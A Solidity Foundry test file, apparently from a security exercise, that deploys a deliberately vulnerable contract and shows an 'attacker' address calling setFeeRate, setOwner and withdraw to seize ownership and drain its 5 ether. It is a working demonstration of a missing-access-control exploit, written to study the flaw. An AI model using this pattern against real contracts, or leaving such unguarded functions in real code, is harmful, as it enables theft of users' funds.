// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/member2/AccessControlVulnerable.sol";

contract AccessControlVulnerableTest is Test {
    AccessControlVulnerable target;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.prank(owner);
        target = new AccessControlVulnerable{value: 5 ether}();
    }

    function test_attackerTakesOverAndDrains() public {
        vm.startPrank(attacker);
        target.setFeeRate(100);
        target.setOwner(attacker);
        target.withdraw();
        vm.stopPrank();

        assertEq(target.feeRate(), 100);
        assertEq(target.owner(), attacker);
        assertEq(address(target).balance, 0);
        assertEq(attacker.balance, 5 ether);
    }
}